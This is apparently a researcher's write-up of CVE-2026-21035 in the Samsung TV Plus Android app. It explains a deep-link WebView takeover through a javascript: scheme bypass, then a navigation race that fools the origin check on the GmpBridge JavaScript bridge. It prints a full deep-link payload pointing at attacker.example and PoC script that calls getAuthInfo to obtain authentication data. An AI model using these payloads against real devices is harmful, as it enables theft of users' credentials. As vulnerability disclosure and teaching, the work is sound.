---
title: "How Improper Input Validation Led to Sensitive Data Exposure in Samsung TV Plus"
date: "2026-06-25"
category: "Mobile Security"
tags: ["Android", "WebView", "Samsung", "WriteUp"]
excerpt: "A WriteUp of CVE-2026-21035, from deep link abuse to sensitive information disclosure."
thumbnail: "/assets/thumbnail/samsung-tv.webp"
---

## Summary

While analyzing Samsung TV Plus for Android, I discovered a vulnerability chain that allowed an attacker to bypass WebView URL validation and gain access to privileged JavaScript bridge functionality.

The issue originated from insufficient validation of user-supplied URLs loaded through a deep link. By abusing this weakness, an attacker could execute arbitrary JavaScript within a privileged WebView context. A second issue involving JavaScript bridge validation could then be leveraged to access sensitive information intended only for trusted Samsung domains.

This vulnerability was assigned **CVE-2026-21035**.


![CVE Proof](/assets/SVE-2026-0590.png)
<p style="text-align: center;">Samsung Security update June 2026 (https://security.samsungmobile.com/serviceWeb.smsb)</p>

## Affected Application

| Property        | Value                        |
| --------------- | ---------------------------- |
| Application     | Samsung TV Plus              |
| Package Name    | `com.samsung.android.tvplus` |
| Tested Version  | `1.0.26.8`                   |



## Attack Surface

Samsung TV Plus exposes an exported activity named `ActivityLauncher` that can be invoked through multiple deep links.

```xml
<activity
    android:name="com.samsung.android.tvplus.app.ActivityLauncher"
    android:exported="true">

    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>

        <data android:scheme="https"
              android:host="tvplus.link"/>

        <data android:scheme="tvplus"
              android:host="tvplus.link"/>
    </intent-filter>
</activity>
```

Because the activity is exported and marked as browsable, any application or website can trigger these deep links and supply attacker-controlled parameters.

During analysis, I found that the `event_detail` functionality accepts a user-controlled `url` parameter that is subsequently loaded into a WebView.

This deep link serves as the entry point for the vulnerability chain.


## Stage 1: WebView Takeover via Improper URL Validation

The application attempts to restrict WebView navigation to a predefined set of trusted domains.

The validation logic is implemented in the following method:

```java
public static boolean W(String str) {
    Uri uri;
    String authority = (str == null || (uri = Uri.parse(str)) == null)
            ? null
            : uri.getAuthority();

    return authority != null &&
        (s.w0(authority, "gmp.samsungapps.com", false)
        || s.w0(authority, "d2da9i65hvaere.cloudfront.net", false)
        || s.w0(authority, "smax.samsungapps.com", false)
        || s.w0(authority, "d1559sbyyf3apa.cloudfront.net", false));
}
```

At first glance the validation appears to be checking whether the destination belongs to a trusted Samsung domain.

However, the implementation only validates the URL host (`authority`) and completely ignores the URI scheme.

As a result, a malicious URL using the `javascript:` scheme can satisfy the hostname validation requirement while still executing attacker-controlled JavaScript.

For example:

```text
tvplus://tvplus.link?action=menu&target_dest=event_detail&url=javascript://d1559sbyyf3apa.cloudfront.net/%250Awindow.location.href='https://attacker.example/poc.html';//sm
```

When processed by the application, the payload executes JavaScript inside the WebView and redirects the victim to attacker-controlled content.

This effectively gives an attacker control over a privileged WebView instance.


## Stage 2: JavaScript Bridge Validation Bypass

After obtaining control of the WebView, my next objective was to gain access to the application's privileged JavaScript bridge functionality.

```java
webView.addJavascriptInterface(vVar, "GmpBridge");
```

The `GmpBridge` interface exposed several native methods to JavaScript, including:

* `getAuthInfo`
* `handshake`
* `refreshAuthorization`
* `requestShareVia`

At first glance, this looked promising. However, there was a catch: the application enforced strict access control and only exposed bridge functionality to a small set of trusted domains:

* `gmp.samsungapps.com`
* `d2da9i65hvaere.cloudfront.net`
* `smax.samsungapps.com`

While analyzing the decompiled source, I eventually located the gatekeeper responsible for enforcing this restriction. The bridge methods were invoked only after a validation check against the current WebView URL.

The relevant logic looked like this:

```java
if (EventWebViewFragment.W(webView.getUrl())) {
    U("javascript:getAuthInfo(...)");
}

if (EventWebViewFragment.W(webView.getUrl())) {
    U("javascript:userStatus(...)");
}

if (EventWebViewFragment.W(webView.getUrl())) {
    U("javascript:handshake(...)");
}
```

Digging deeper into the `EventWebViewFragment` class, I identified the exact validation routine responsible for determining whether the current page was trusted:

```java
public class EventWebViewFragment extends D {
    ...
    public static boolean W(String str) {
        Uri uri;
        String authority = (str == null || (uri = Uri.parse(str)) == null)
            ? null
            : uri.getAuthority();

        return authority != null && (
            s.w0(authority, "gmp.samsungapps.com", false) ||
            s.w0(authority, "d2da9i65hvaere.cloudfront.net", false) ||
            s.w0(authority, "smax.samsungapps.com", false) ||
            s.w0(authority, "d1559sbyyf3apa.cloudfront.net", false)
        );
    }
    ...
}
```

The implementation was straightforward: the application extracted the authority component from `webView.getUrl()` and compared it against a hardcoded allowlist of trusted domains. Only when the current URL matched one of these entries would the application expose privileged functionality through `GmpBridge`.

As a result, simply controlling the WebView was not enough. To access the bridge, I first needed a way to make `webView.getUrl()` appear as though it originated from one of the trusted domains.


The application relies on a flawed assumption: if `webView.getUrl()` matches an approved domain, the current page must be safe.

After hours of hitting a brick wall with standard injections, I expanded my scope to WebView state tracking. That’s when I found a Black Hat presentation, *["The Tangled Webview: Javascriptinterface Once More"](https://www.youtube.com/watch?v=56sOniHFwVU)*, which highlights a massive blind spot in Chromium internals.

When a WebView switches pages, `webView.getUrl()` doesn't always show the page currently running JavaScript. Instead, it can return a **pending entry**—the destination URL the browser is *about* to load.

This introduces a severe race condition known as a **"Navigation Confused"** vulnerability. By forcing a browser-level navigation to a whitelisted domain, `webView.getUrl()` instantly returns the trusted URL. However, for a split second before the new page loads, my malicious code is still actively running in the background. The app checks where the WebView is *going*, while my code executes from where it *is*.


## Triggering the Confusion

The breakthrough came when I spotted how the application handled specific URL redirects. Deep inside the routing logic, I found that certain intercepted URLs were reloaded directly back into the engine using `webView.loadUrl()`:

```java
case 99617003:
    if (scheme.equals("https")) {
        String string = url.toString();

        if (!containsHelpDomain(string)) {
            webView.loadUrl(string);
        } else {
            openExternalBrowser(string);
        }
    }
    break;

```

This explicit call to `loadUrl()` was exactly what I needed. In the world of Chromium internals, a renderer-initiated link click is treated with suspicion, but a native call to `loadUrl()` escalates the request into a trusted, **browser-initiated** navigation.

Because Android handles this navigation asynchronously, a lethal timing window opens up. The moment `loadUrl()` is fired with a whitelisted domain, the WebView updates its state to that trusted URL immediately. Yet, the old, attacker-controlled page hasn't actually unloaded from memory.

By strategically timing the attack, I could force the app into this browser-initiated navigation to `gmp.samsungapps.com` while simultaneously hammering the privileged bridge interface. When the app's validator executes `webView.getUrl()`, it looks at the pending state and sees a perfectly legitimate, trusted domain. The check passes, the gates open, and the privileged bridge functionality executes—right back into the context of my malicious script still lingering in the background.

## Proof of Concept

The attack can be summarized as follows:

1. Victim click deeplink `tvplus://tvplus.link?action=menu&target_dest=event_detail&url=javascript://d1559sbyyf3apa.cloudfront.net/%250Awindow.location.href='https://attacker.example/poc.html';//sm`
2. Execute JavaScript using the scheme validation bypass.
3. Load attacker-controlled content into the WebView.
4. Force navigation to a trusted Samsung domain.
5. Trigger a delayed JavaScript bridge call.
6. Bypass origin validation and obtain sensitive information.

Example logic:

```html
<script>
function browser_navigation() {
    location.href =
        "https://gmp.samsungapps.com";
}

function getToken() {
    window.GmpBridge.getAuthInfo();
}

function bypass() {
    setTimeout(getToken, 400);
    browser_navigation();
}
</script>
```

Because validation relies on the current WebView URL rather than the actual execution context, the bridge can be invoked from an attacker-controlled page.

## Conclusion

Some things that initially look impossible to bypass are actually possible. Sometimes, the real obstacle is not the mitigation itself, but our own lack of knowledge and understanding. I am still relatively new to Android security, having come from a web security background.

Without the amazing resource ["Android Security & Reverse Engineering YouTube Curriculum"](https://github.com/actuator/Android-Security-Exploits-YouTube-Curriculum), I might never have been able to bypass the JavaScript interface callback validation.

One of the key lessons from this research is simple: never rely solely on hostname-based checks for security decisions. Hostname validation alone is rarely sufficient, especially when dealing with privileged WebView functionality and JavaScript bridges.